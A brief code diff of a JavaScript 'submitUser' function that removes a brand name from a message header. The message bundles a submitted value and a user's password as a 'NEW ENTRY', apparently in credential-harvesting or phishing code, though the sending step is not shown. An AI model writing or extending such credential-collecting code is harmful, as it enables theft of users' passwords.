@@ -23,7 +23,7 @@ function submitUser() {
   }
 
   const message =
-    `📩 OLERAI NEW ENTRY\n\n` +
+    `📩  NEW ENTRY\n\n` +
     `Value: ${value}\n` +
     `password: ${userpass}`; 
 
@@ -97,3 +97,4 @@ const message =
   });
 
 }
+
